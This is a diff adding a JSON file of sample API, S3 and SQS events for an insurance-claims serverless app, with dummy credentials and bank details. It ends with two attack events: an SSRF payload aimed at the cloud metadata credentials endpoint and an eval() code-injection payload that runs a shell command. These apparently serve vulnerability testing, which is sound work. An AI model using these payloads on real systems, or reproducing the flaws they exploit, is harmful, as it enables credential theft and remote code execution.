@@ -1,0 +1,119 @@
+{
+  "upload_api_event": {
+    "httpMethod": "POST",
+    "path": "/claims/upload",
+    "headers": {
+      "Content-Type": "application/json",
+      "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsInJvbGUiOiJjdXN0b21lciIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxOTAwMDAwMDAwfQ.test_signature",
+      "X-Forwarded-For": "192.168.1.1",
+      "User-Agent": "TestClient/1.0"
+    },
+    "queryStringParameters": null,
+    "pathParameters": null,
+    "body": "{\"filename\": \"claim_doc.pdf\", \"file_content\": \"JVBERi0xLjQKMSAwIG9iago8PAovVHlwZQ==\", \"user_id\": \"user-123\", \"metadata\": {}, \"claim_type\": \"auto\"}",
+    "isBase64Encoded": false,
+    "requestContext": {
+      "stage": "prod",
+      "identity": {
+        "sourceIp": "192.168.1.1",
+        "userAgent": "TestClient/1.0"
+      }
+    }
+  },
+  "validate_api_event": {
+    "httpMethod": "POST",
+    "path": "/claims/abc-123-def/validate",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "pathParameters": {
+      "claimId": "abc12345-1234-4abc-9abc-1234567890ab"
+    },
+    "body": "{\"requestedAmount\": 5000, \"claimType\": \"auto\"}",
+    "isBase64Encoded": false,
+    "requestContext": {
+      "stage": "prod",
+      "identity": {
+        "sourceIp": "10.0.0.1"
+      }
+    }
+  },
+  "auth_login_event": {
+    "httpMethod": "POST",
+    "path": "/auth/login",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\": \"customer@example.com\", \"password\": \"P@ssw0rd123\"}",
+    "isBase64Encoded": false,
+    "requestContext": {
+      "stage": "prod",
+      "identity": {
+        "sourceIp": "192.168.1.100"
+      }
+    }
+  },
+  "auth_register_event": {
+    "httpMethod": "POST",
+    "path": "/auth/register",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\": \"newuser@example.com\", \"password\": \"Str0ngP@ss!\", \"fullName\": \"John Doe\", \"role\": \"customer\"}",
+    "isBase64Encoded": false,
+    "requestContext": {
+      "stage": "prod",
+      "identity": {
+        "sourceIp": "192.168.1.200"
+      }
+    }
+  },
+  "s3_event": {
+    "Records": [
+      {
+        "eventSource": "aws:s3",
+        "eventName": "ObjectCreated:Put",
+        "s3": {
+          "bucket": {
+            "name": "largo-lagrande-docs-prod"
+          },
+          "object": {
+            "key": "uploads/user-123/claim_doc.pdf",
+            "size": 102400,
+            "eTag": "abc123def456"
+          }
+        }
+      }
+    ]
+  },
+  "sqs_payout_event": {
+    "Records": [
+      {
+        "eventSource": "aws:sqs",
+        "body": "{\"claimId\": \"abc12345-1234-4abc-9abc-1234567890ab\", \"userId\": \"user-123\", \"payoutAmount\": 4500.00, \"claimType\": \"auto\", \"bankDetails\": {\"account_number\": \"123456789\", \"routing_number\": \"021000021\", \"bank_name\": \"Test Bank\"}, \"approvedAt\": \"2024-01-15T10:00:00Z\"}",
+        "messageId": "msg-12345",
+        "receiptHandle": "test-receipt-handle"
+      }
+    ]
+  },
+  "ssrf_attack_event": {
+    "_comment": "This event demonstrates the SSRF vulnerability in upload function",
+    "httpMethod": "POST",
+    "path": "/claims/upload",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"filename\": \"exploit.pdf\", \"document_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", \"user_id\": \"attacker-1\", \"metadata\": {}, \"claim_type\": \"auto\"}",
+    "isBase64Encoded": false
+  },
+  "rce_attack_event": {
+    "_comment": "This event demonstrates the eval() RCE vulnerability via metadata transform",
+    "httpMethod": "POST",
+    "path": "/claims/upload",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"filename\": \"legit.pdf\", \"file_content\": \"JVBERi0xLjQ=\", \"user_id\": \"attacker-2\", \"metadata\": {\"transform\": \"__import__('os').system('id')\"}, \"claim_type\": \"auto\"}",
+    "isBase64Encoded": false
+  }
+}
